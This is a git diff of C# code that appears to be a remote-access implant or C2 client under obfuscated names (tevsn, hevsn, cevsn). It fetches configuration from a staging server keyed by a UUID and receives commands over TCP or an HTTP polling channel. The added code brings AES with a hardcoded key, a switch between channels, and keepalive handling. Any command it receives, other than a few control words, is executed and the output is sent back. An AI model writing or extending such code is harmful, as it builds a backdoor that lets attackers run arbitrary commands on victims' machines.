@@ -11,6 +11,9 @@ using System.Threading;
 using System.Threading.Tasks;
 using tevsn;
 using System.Net;
+using hevsn;
+using cevsn.encrn.rsa;
+using cevsn.encrn;
 
 namespace cevsn
 {
@@ -18,9 +21,9 @@ namespace cevsn
     {
         public static String URL = "http://127.0.0.1:8082/initialRSA.txt";
         public static String UUID = Guid.NewGuid().ToString();
+        public volatile static byte[] iv = new byte[16];
         public volatile static string Key = "";
         public volatile static string PrivKey = "";
-        public volatile static byte[] IV = new byte[16];
         public volatile static String IP = "";
         public volatile static int PORT = 0;
         public volatile static string Type = "";
@@ -28,10 +31,16 @@ namespace cevsn
         public volatile static string Salt = "";
         public static readonly HttpClient client = new HttpClient();
         public volatile static Tevsn? tevsn = null;
+        public volatile static Hevsn? hevsn = null;
+        public volatile static cevsn.encrn.rsa.RSA? rsa = null;
+        public volatile static AES? aes = null;
         public volatile static Boolean IsConnected = false;
         public volatile static Boolean Running = false;
         public volatile static Boolean first = false;
         public volatile static int counter = 0;
+        public volatile static Boolean firstHTTP = false;
+
+        public volatile static string cont = "";
         public volatile static Boolean gotHostInformation = false;
 
         public static async Task Main(string[] args)
@@ -46,13 +55,14 @@ namespace cevsn
                     while(gotHostInformation == false)
                     {
                         URL = "http://127.0.0.1:8082/"+UUID+".txt";
-                        string cont = getContent();
+                        cont = getContent();
                         if(cont == "")
                         {
                             URL = URL = "http://127.0.0.1:8082/initialRSA.txt";
-                            cont = getContent();
+                            Update();
+                        } else {
+                            parseHostInformation(cont);
                         }
-                        parseHostInformation(cont);
                         Thread.Sleep(3500);
                     }
                     Boolean checker = false;
@@ -88,14 +98,30 @@ namespace cevsn
                                             Thread.Sleep(5000);
                                             try
                                             {
-                                                string cont = getContent();
-                                                parseHostInformation(cont);
-                                                tevsn.PrivKey = PrivKey;
+                                                Update();
+                                                //rsa!.PrivKey = PrivKey;
                                             } catch (Exception) {
                                                 Console.Write("Failed to get private key!\n");
                                             }
                                             string recv1 = tevsn.Receive();
-                                            tevsn.Send(tevsn.exec(recv1));
+                                            if (recv1.Equals("reviveTime")) {
+                                                tevsn.Fallback();
+                                                IsConnected = tevsn.IsConnected();
+                                                if(!IsConnected)
+                                                {
+                                                    first = false;
+                                                    break;
+                                                }
+                                            } else if(recv1.Equals("--")) {
+                                                tevsn.Send("keepalive");
+                                            } else if (recv1.Equals("httpSw")) {
+                                                Type = "HTTP";
+                                                Update();
+                                                tevsn.Disconnect();
+                                                break;
+                                            } else {
+                                                tevsn.Send(tevsn.exec(recv1));
+                                            }
                                             IsConnected = tevsn.IsConnected();
                                             first = true;
                                             Thread.Sleep(1000);
@@ -104,10 +130,11 @@ namespace cevsn
                                             if(!IsConnected)
                                             {
                                                 first = false;
+                                                break;
                                             }
                                         }
                                     } else {
-                                        Console.Write("Waiting");
+                                        Console.Write("Waiting" + "\n");
                                         string recv = tevsn.Receive();
                                         Console.Write(recv);
                                         if (recv.Equals("reviveTime")) {
@@ -116,21 +143,46 @@ namespace cevsn
                                             if(!IsConnected)
                                             {
                                                 first = false;
+                                                break;
                                             }
                                         } else if(recv.Equals("--")) {
-                                            
                                             tevsn.Send("keepalive");
-                                        }  else {
+                                        } else if (recv.Equals("httpSw")) {
+                                            Type = "HTTP";
+                                            Update();
+                                            tevsn.Disconnect();
+                                            break;
+                                        } else {
                                             tevsn.Send(tevsn.exec(recv));
                                         }
                                     }
-                                    Thread.Sleep(1000);
+                                    Thread.Sleep(2500);
                                 }
                             }
                         }
                         if(Type.Equals("HTTP"))
                         {
-                            
+                            //hevsn = new Hevsn("http://127.0.0.1:"+PORT+"/lit", rsa!);
+                            if(!firstHTTP)
+                            {
+                                hevsn = new Hevsn("http://127.0.0.1:"+PORT+"/lit", aes!);
+                                hevsn.sendInit();
+                                firstHTTP = true;
+                            }
+                            while(Type.Equals("HTTP"))
+                            {
+
+                                hevsn!.getCommands("give");
+                                if(hevsn.getCommand().Length > 1)
+                                {
+                                    string comm = hevsn.getCommand();
+                                    if(!comm.Equals(""))
+                                    {
+                                        hevsn.SendOutp(hevsn.makeOutp(hevsn.exec(comm)));
+                                    }
+                                }
+                                Thread.Sleep(3000);
+                            }
                         }
                         counter++;
                         Thread.Sleep(2000);
@@ -140,6 +192,12 @@ namespace cevsn
 
             });
             
+        }
+
+        public static void Update()
+        {
+            string cont = getContent();
+            parseHostInformation(cont);
         }
 
         //create getOsName method
@@ -169,7 +227,10 @@ namespace cevsn
             try 
             {
                 Task<string> response = client.GetStringAsync(URL);
-                Console.Write("Got content from server! \n");
+                if(response.Result.ToString().Length > 5)
+                {
+                    Console.Write("Got content from server! \n");
+                }
                     
                 return response.Result.ToString();
             } catch (Exception)
@@ -186,21 +247,24 @@ namespace cevsn
                 string[] lines = content.Split(';');
                 IP = lines[0];
                 PORT = Int32.Parse(lines[1]);
-                byte[] typeTmp = Convert.FromBase64String(lines[2]);
-                Type = System.Text.Encoding.ASCII.GetString(typeTmp);
-                Key = lines[3];
+                Type = Encoding.UTF8.GetString(Convert.FromBase64String(lines[2]));
+                iv = Convert.FromBase64String(lines[3]);
+                /*
                 if(lines.Length > 4)
                 {
                     Console.Write("Got PRIV!\n");
                     PrivKey = lines[4];
                 }
+                */
                 gotHostInformation = true;
             }
         }
 
         public static Tevsn CreateTevsn(string ip, int port, string key)
         {
-            return new Tevsn(ip, port, key);
+            //rsa = new encrn.rsa.RSA(key);
+            aes = new AES("lol123", iv);
+            return new Tevsn(ip, port, aes);
         }
     }
 }
